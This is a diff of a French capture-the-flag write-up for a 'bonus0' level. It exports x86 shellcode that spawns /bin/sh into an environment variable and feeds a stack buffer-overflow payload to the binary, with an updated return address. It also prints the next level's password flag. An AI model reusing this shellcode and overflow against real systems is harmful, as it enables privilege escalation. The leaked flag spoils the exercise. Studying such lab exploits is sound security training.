@@ -133,7 +133,9 @@ Cependant hors gdb cela ne marche pas, surement du a un decalage avec les adress
 
 export EGG=`python -c 'print "\x90" * 100 + "\x31\xc0\x31\xdb\x31\xd2\x53\x68\x55\x6e\x69\x0a\x68\x64\x55\x55\x4d\x68\x41\x68\x6d\x61\x89\xe1\xb2\x0f\xb0\x04\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
 
-(python -c 'print "A" * 100'; python -c 'print "A" * 9 + "\xe9" + "\xf8" +"\xff" +"\xbf" + "B" * 7'; cat ) | ./bonus0
+Avec un nouveau check sur l'adresse de la variable d'environnement, nous remaquons que l'adresse a changé donc nous adaptons notre payload :
+
+(python -c 'print "A" * 100'; python -c 'print "A" * 9 + "\x88" + "\xf8" +"\xff" +"\xbf" + "B" * 7'; cat ) | ./bonus0  // L'adresse ici peut avoir changée donc a adapter en fonction de l'adresse encore une fois
  -
  -
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����BBBBBBB�� AAAAAAAAA����BBBBBBB��
@@ -143,4 +145,3 @@ cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 
 Nous sommes bien log comme bonus1 et nous obtenons le flag
-
